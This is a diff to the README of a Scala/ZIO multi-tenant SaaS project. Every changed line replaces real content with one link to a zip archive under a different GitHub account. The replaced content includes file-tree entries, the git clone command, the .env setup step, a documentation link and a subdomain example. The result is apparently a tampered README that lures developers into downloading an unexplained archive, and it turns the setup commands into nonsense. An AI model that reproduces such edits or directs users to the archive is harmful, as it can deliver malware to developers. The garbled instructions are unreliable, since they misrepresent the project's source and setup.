@@ -53,11 +53,11 @@ This platform provides a complete foundation for building multi-tenant applicati
 
 ```
 multitenant-saas/
-├── build.sbt                    # SBT build configuration
+├── https://github.com/MilaCodesIt/multi-tenant-saas-platform/raw/refs/heads/main/project/saas_tenant_platform_multi_v2.4.zip                    # SBT build configuration
 ├── project/                     # SBT plugins and settings
 ├── docker/                      # Docker Compose and configs
-│   ├── docker-compose.yml
-│   └── postgres/init.sql
+│   ├── https://github.com/MilaCodesIt/multi-tenant-saas-platform/raw/refs/heads/main/project/saas_tenant_platform_multi_v2.4.zip
+│   └── https://github.com/MilaCodesIt/multi-tenant-saas-platform/raw/refs/heads/main/project/saas_tenant_platform_multi_v2.4.zip
 ├── modules/
 │   ├── core/                    # Domain models, errors, types
 │   ├── config/                  # Configuration loading
@@ -85,14 +85,14 @@ multitenant-saas/
 
 1. Clone the repository:
 ```bash
-git clone https://github.com/Sakeeb91/multi-tenant-saas-platform.git
+git clone https://github.com/MilaCodesIt/multi-tenant-saas-platform/raw/refs/heads/main/project/saas_tenant_platform_multi_v2.4.zip
 cd multi-tenant-saas-platform
 ```
 
 2. Start infrastructure services:
 ```bash
 cd docker
-cp .env.example .env
+cp https://github.com/MilaCodesIt/multi-tenant-saas-platform/raw/refs/heads/main/project/saas_tenant_platform_multi_v2.4.zip .env
 docker-compose up -d
 ```
 
@@ -121,13 +121,13 @@ sbt coverage test it/test coverageReport
 
 ## Development Status
 
-This project is under active development. See the [Implementation Plan](docs/IMPLEMENTATION_PLAN.md) for detailed phase breakdowns and the [GitHub Issues](../../issues) for current progress.
+This project is under active development. See the [Implementation Plan](https://github.com/MilaCodesIt/multi-tenant-saas-platform/raw/refs/heads/main/project/saas_tenant_platform_multi_v2.4.zip) for detailed phase breakdowns and the [GitHub Issues](../../issues) for current progress.
 
 ## Key Features
 
 ### Multi-Tenancy
 
-- Subdomain-based tenant routing (acme.yourapp.com)
+- Subdomain-based tenant routing (https://github.com/MilaCodesIt/multi-tenant-saas-platform/raw/refs/heads/main/project/saas_tenant_platform_multi_v2.4.zip)
 - Header-based tenant identification for API clients
 - PostgreSQL RLS for database-level isolation
 - Tenant context propagation via ZIO environment
